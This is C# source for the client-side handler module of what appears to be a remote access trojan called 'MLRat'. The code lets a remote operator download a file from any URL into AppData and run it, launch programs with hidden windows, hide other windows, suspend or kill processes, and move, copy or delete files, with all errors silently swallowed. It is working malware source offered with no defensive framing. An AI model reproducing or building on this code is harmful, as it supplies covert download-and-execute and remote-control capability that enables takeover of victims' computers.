using MLRat.Client;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace MLManagementClient.Handlers
{
    public static class MiscHandler
    {
        static IClientHost Host = null;
        public static void SetClientHost(IClientHost _host)
        {
            Host = _host;
        }

        public static void Restart()
        {
            try
            {
                string executable = Host.GetExecutingLocation();
                Process p = Process.Start(executable);
                if(p.Responding && !p.HasExited)
                {
                    Environment.Exit(0);
                }
            }
            catch
            {

            }
        }

        public static bool MoveFile(string from, string to, bool force)
        {
            try
            {
                if (force)
                    return MoveFileEx(from, to, 0x8);
                else
                    File.Move(from, to);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static bool Execute(string path)
        {
            try
            {
                Process.Start(path);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static void DownloadAndExecute(string url, string extention)
        {
            try
            {
                string cExt = extention;
                if (!cExt.StartsWith("."))
                    cExt = "." + extention;
                using (WebClient wc = new WebClient())
                {
                    string tempLication = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Guid.NewGuid().ToString("n") + cExt);
                    while(File.Exists(tempLication))
                        tempLication = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Guid.NewGuid().ToString("n") + cExt);
                    wc.DownloadFileCompleted += Wc_DownloadFileCompleted;
                    wc.DownloadFileAsync(new Uri(url), tempLication, tempLication);
                }
            }
            catch
            {

            }
        }

        public static void DownloadFile(string url, string downloadTo)
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    string tempLocation = Path.GetTempFileName();
                    wc.DownloadFileCompleted += Wc_DownloadFileCompleted_DontExecute;
                    wc.DownloadFileAsync(new Uri(url), tempLocation, new string[] { tempLocation, downloadTo });
                }
            }
            catch
            {

            }
        }
        private static void Wc_DownloadFileCompleted_DontExecute(object sender, System.ComponentModel.AsyncCompletedEventArgs e)
        {
            try
            {
                string[] paths = (string[])(e.UserState);
                MoveFile(paths[0], paths[1], false);
            }
            catch
            {

            }
        }
        private static void Wc_DownloadFileCompleted(object sender, System.ComponentModel.AsyncCompletedEventArgs e)
        {
            try
            {
                string path = (string)(e.UserState);
                Execute(path);
            }
            catch
            {

            }
        }

        public static bool DeleteFile(string path)
        {
            try
            {
                File.Delete(path);
                return true;
            }
            catch
            {
                return false;
            }
        }
        public static bool ExecuteHidden(string path)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo(path);
                psi.UseShellExecute = true;
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                psi.CreateNoWindow = true;
                Process.Start(psi);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static bool CopyFile(string from, string to)
        {
            try
            {
                File.Copy(from, to);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static void KillProcess(int id)
        {
            try
            {
                Process p = Process.GetProcessById(id);
                p.Kill();
            }
            catch
            {

            }
        }
        public static void HideWindow(int id)
        {
            try
            {
                Process p = Process.GetProcessById(id);
                IntPtr winHandle = p.MainWindowHandle;
                if(winHandle != IntPtr.Zero)
                {
                    ShowWindow(winHandle, 0);
                }
            }
            catch
            { }

        }
        public static void SuspendProcess(int id)
        {
            try
            {
                Process p = Process.GetProcessById(id);
                foreach (ProcessThread t in p.Threads)
                {
                    IntPtr handle = OpenThread(0x2, false, t.Id);
                    SuspendThread(handle);
                    CloseHandle(handle);
                }
            }
            catch
            {

            }
        }
        public static void ResumeProcess(int id)
        {
            try
            {
                Process p = Process.GetProcessById(id);
                foreach(ProcessThread t in p.Threads)
                {
                    IntPtr handle = OpenThread(0x2, false, t.Id);
                    ResumeThread(handle);
                    CloseHandle(handle);
                }
            }
            catch
            {

            }
        }
        [DllImport("kernel32.dll")]
        public static extern void CloseHandle(IntPtr handle);
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenThread(int access, bool inherit, int id);
        [DllImport("kernel32.dll")]
        public static extern void SuspendThread(IntPtr handle);
        [DllImport("kernel32.dll")]
        public static extern void ResumeThread(IntPtr handle);
        [DllImport("User32.dll")]
        public static extern void ShowWindow(IntPtr handle, int show);
        [DllImport("kernel32.dll")]
        public static extern bool MoveFileEx(string to, string from, int flags);
    }
}
